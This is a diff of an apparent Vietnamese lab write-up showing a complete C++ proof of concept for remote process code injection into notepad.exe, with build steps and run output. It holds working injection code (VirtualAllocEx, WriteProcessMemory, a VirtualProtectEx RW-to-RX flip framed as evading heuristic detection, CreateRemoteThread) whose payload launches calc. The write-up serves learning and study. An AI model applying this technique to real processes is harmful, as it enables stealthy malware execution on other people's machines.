@@ -48,123 +48,128 @@ Mã nguồn tuân thủ nghiêm ngặt nguyên lý thiết kế **Cấp phát đ
 #include <string>
 #include <vector>
 
-// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí nạp RAM
+#pragma comment(lib, "user32.lib")
+
+// Bộ quét RAM động tìm PID thích ứng theo tên tiến trình (Không phân biệt chữ hoa/thường)
+DWORD GetTargetProcessPID(const std::wstring& procName) {
+    DWORD pid = 0;
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    if (Process32FirstW(hSnapshot, &pe32)) {
+        do {
+            // Tự động hóa đối chiếu hoa thường để detect Notepad.exe chính xác
+            if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
+                pid = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hSnapshot, &pe32));
+    }
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
+// 1. Định nghĩa cấu trúc con trỏ hàm tuyệt đối để xử lý độc lập vị trí
 typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
-typedef struct _PROTECT_THREAD_DATA {
+typedef struct _THREAD_DATA {
     fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
-} PROTECT_THREAD_DATA, *PPROTECT_THREAD_DATA;
+    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
+} THREAD_DATA, * PTHREAD_DATA;
 
-// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy chéo tiến trình
-DWORD WINAPI RemoteProtectPayload(LPVOID lpParam) {
-    PPROTECT_THREAD_DATA pData = (PPROTECT_THREAD_DATA)lpParam;
+// 2. Hàm đích gánh logic thực thi độc lập vị trí
+DWORD WINAPI RemoteLaunchCalculatorVP(LPVOID lpParam) {
+    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
     if (pData && pData->pWinExec) {
         pData->pWinExec(pData->szCommand, SW_HIDE);
     }
     return 0;
 }
 
-// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
-DWORD GetTargetProcessPID(const std::wstring& procName) {
-    DWORD pid = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot != INVALID_HANDLE_VALUE) {
-        if (Process32FirstW(hSnapshot, &pe32)) {
-            do {
-                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { 
-                    pid = pe32.th32ProcessID; 
-                    break; 
-                }
-            } while (Process32NextW(hSnapshot, &pe32));
-        }
-        CloseHandle(hSnapshot);
-    }
-    return pid;
-}
-
 int main() {
     std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 04: REMOTE INJECTION - VIRTUALPROTECT RX" << std::endl;
+    std::cout << "[*] PE 04: CLASSIC CODE INJECTION REMOTE WITH VP" << std::endl;
     std::cout << "====================================================" << std::endl;
 
-    std::wstring targetProcessName = L"notepad.exe";
-    DWORD dwPID = GetTargetProcessPID(targetProcessName);
+    std::wstring targetName = L"notepad.exe";
+    DWORD dwPID = GetTargetProcessPID(targetName);
+
     if (dwPID == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
-        std::cin.get();
+        MessageBoxA(NULL, "[-] Target process not found! Please open Notepad first.", "Error", MB_OK | MB_ICONERROR);
         return EXIT_FAILURE;
     }
+
     std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwPID);
     if (!hProcess) {
-        std::cerr << "[-] OpenProcess failed! Quyen han CLI bi gioi han." << std::endl;
+        std::cerr << "[-] OpenProcess failed!" << std::endl;
         return EXIT_FAILURE;
     }
 
-    SIZE_T functionSize = 500;
+    SIZE_T functionSize = 500; // Kích thước ước tính an toàn cho thân hàm
 
-    // BƯỚC 1: Né tránh bộ lọc Heuristic - Chỉ cấp phát vùng nhớ mang quyền ĐỌC/GHI (PAGE_READWRITE)
-    std::cout << "[*] Dang ngu trang cap phat phan vung mang quyen RW..." << std::endl;
+    // ─── BƯỚC 1: CẤP PHÁT BỘ NHỚ AN TOÀN PAGE_READWRITE (CHƯA CÓ QUYỀN THỰC THI) ───
     LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    LPVOID remoteDataBuffer = VirtualAllocEx(hProcess, NULL, sizeof(PROTECT_THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    if (!remoteCodeBuffer || !remoteDataBuffer) {
-        std::cerr << "[-] VirtualAllocEx failed!" << std::endl;
-        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
+    if (!remoteCodeBuffer) {
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Trang nho Code khoi tao voi quyen RW tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
+    std::cout << "[+] Phan vung Code khoi tao voi quyen RW tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
 
-    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ phục vụ ánh xạ chéo RAM
-    PROTECT_THREAD_DATA localData;
+    // Cấp phát phân vùng dữ liệu tham số mang quyền RW từ xa
+    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemoteData) {
+        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+    }
+
+    // ─── BƯỚC 2: GHI MÃ MÁY VÀ DỮ LIỆU VÀO VÙNG NHỚ THÔ THÔNG THƯỜNG ───
+    THREAD_DATA localData;
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (hKernel32) {
         localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
     }
     strcpy_s(localData.szCommand, "cmd.exe /c start calc");
 
-    // BƯỚC 2: Ghi dữ liệu Payload lên phân vùng thuộc tính RW thông thường
-    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteProtectPayload, functionSize, NULL);
-    WriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(PROTECT_THREAD_DATA), NULL);
-    std::cout << "[+] Na nap ma may va tham so sang phan vung RW hoan tat." << std::endl;
+    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPVOID)RemoteLaunchCalculatorVP, functionSize, NULL);
+    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
+    std::cout << "[+] Day logic ham va cau truc tham so sang RAM Notepad hoan tat." << std::endl;
 
-    // BƯỚC 3: CHIẾN THUẬT LẬT CỜ BẢNG TRANG - Chuyển đổi thuộc tính vùng nhớ sang PAGE_EXECUTE_READ (RX)
-    std::cout << "[*] Dang kich hoat VirtualProtectEx de mo khoa quyen thuc thi RX..." << std::endl;
+    // ─── BƯỚC 3: ĐỘT PHÁ QUYỀN HẠN - LẬT THUỘC TÍNH TRANG NHỚ SANG RX ───
     DWORD oldProtect = 0;
-    BOOL isProtected = VirtualProtectEx(hProcess, remoteCodeBuffer, functionSize, PAGE_EXECUTE_READ, &oldProtect);
-    
-    if (!isProtected) {
-        std::cerr << "[-] VirtualProtectEx that bai! Luong bao ve cua OS ngan chan." << std::endl;
-        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
-        VirtualFreeEx(hProcess, remoteDataBuffer, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Mo khoa trang nho sang quyen RX thanh cong! (Co bao ve cu: 0x" << std::hex << oldProtect << ")" << std::endl;
+    std::cout << "[*] Dang dung VirtualProtectEx de lat quyen trang nho Code sang RX..." << std::endl;
 
-    // BƯỚC 4: Kích nổ luồng thực thi an toàn thông qua phân vùng RX phẳng sạch
-    std::cout << "[*] Dang thuc hien khoi tao luong tu xa..." << std::endl;
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
-    
-    if (hThread) {
-        // Đồng bộ hóa luồng nhằm gánh dứt điểm luồng thực thi chéo tiến trình phẳng sạch
-        WaitForSingleObject(hThread, INFINITE); 
-        std::cout << "[+] VirtualProtect Code Injection Successful!" << std::endl;
-        CloseHandle(hThread);
-    } else {
-        std::cerr << "[-] CreateRemoteThread failed! Error Code: " << GetLastError() << std::endl;
+    if (VirtualProtectEx(hProcess, remoteCodeBuffer, functionSize, PAGE_EXECUTE_READ, &oldProtect)) {
+        std::cout << "[+] Lat quyen trang nho thanh cong! Quyen cu: 0x" << std::hex << oldProtect << std::endl;
+
+        // ─── BƯỚC 4: TẠO LUỒNG TỪ XA KÍCH NỔ KHI TRANG NHỚ ĐÃ HỢP LỆ ───
+        std::cout << "[*] Dang khoi tao luong CreateRemoteThread de khai hoa..." << std::endl;
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);
+
+        if (hThread) {
+            // Đợi luồng hoàn thành chu kỳ xử lý mở Máy tính, phá băng nghẽn luồng Windows 11
+            WaitForSingleObject(hThread, INFINITE);
+            std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu." << std::endl;
+            CloseHandle(hThread);
+        }
+        else {
+            std::cerr << "[-] CreateRemoteThread failed! Error: " << std::dec << GetLastError() << std::endl;
+        }
+    }
+    else {
+        std::cerr << "[-] VirtualProtectEx that bai! Ma loi: " << std::dec << GetLastError() << std::endl;
     }
 
-    // Thu hồi tài nguyên Handle hệ thống triệt để chống Memory Leak
+    // ─── BƯỚC 5: GIẢI PHÓNG TÀI NGUYÊN CHỐNG MEMORY LEAK ───
+    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
+    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
     CloseHandle(hProcess);
 
-    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
-    std::cin.get();
+    std::cout << "[+] Quy trinh giai phong RAM tu xa hoan tat." << std::endl;
     return EXIT_SUCCESS;
 }
 
@@ -180,10 +185,6 @@ int main() {
 
 1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
 2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính `Runtime Library`, cấu hình cờ **`Multi-threaded (/MT)`** để nhúng tĩnh (Static Linkage) toàn bộ thư viện hệ thống lọt lòng file thực thi `.exe`.
-
-> **Vị trí đặt ảnh minh chứng cấu hình biên dịch hệ thống:**
-> 
-
 3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng lỗi phân rã chuỗi.
 
 ---
@@ -193,25 +194,24 @@ int main() {
 Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường máy Lab, sau đó kích hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm theo dõi ma trận lật cờ bảo vệ trang nhớ:
 
 ```powershell
-PS C:\Workspace\x64\Release> .\PE04_VirtualProtect_Injection.exe
+PS C:\Users\Admin\source\repos\Task6\PE01_Classic_Code_Injection_Local\x64\Release> C:\Users\Admin\source\repos\Task6\PE04_Classic_Code_Injection_Remote_VP\x64\Release\Classic_Code_Injection_Remote_VP.exe
 ====================================================
-[*] PE 04: REMOTE INJECTION - VIRTUALPROTECT RX
+[*] PE 04: CLASSIC CODE INJECTION REMOTE WITH VP
 ====================================================
-[+] Da tim thay Notepad.exe voi PID: 18240
-[*] Dang ngu trang cap phat phan vung mang quyen RW...
-[+] Trang nho Code khoi tao voi quyen RW tai: 0x0000021F83A20000
-[+] Na nap ma may va tham so sang phan vung RW hoan tat.
-[*] Dang kich hoat VirtualProtectEx de mo khoa quyen thuc thi RX...
-[+] Mo khoa trang nho sang quyen RX thanh cong! (Co bao ve cu: 0x4)
-[*] Dang thuc hien khoi tao luong tu xa...
-[+] VirtualProtect Code Injection Successful!
-
-[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...
+[+] Da tim thay Notepad.exe voi PID: 4556
+[+] Phan vung Code khoi tao voi quyen RW tai: 0x0000028628300000
+[+] Day logic ham va cau truc tham so sang RAM Notepad hoan tat.
+[*] Dang dung VirtualProtectEx de lat quyen trang nho Code sang RX...
+[+] Lat quyen trang nho thanh cong! Quyen cu: 0x4
+[*] Dang khoi tao luong CreateRemoteThread de khai hoa...
+[+] Luong Thread tu xa da hoan thanh nhiem vu.
+[+] Quy trinh giai phong RAM tu xa hoan tat.
 
 ```
 
-> **Vị trí đặt ảnh minh chứng thực nghiệm lật cờ trang nhớ ảo:**
-> 
+# Demo
+<img width="1920" height="1080" alt="devenv_8pZPtZUiqZ" src="https://github.com/user-attachments/assets/ce4f533d-a5fd-4a05-a11f-0764234734d6" />
+
 
 ### 🎯 Phân tích hệ quả cấu trúc RAM:
 
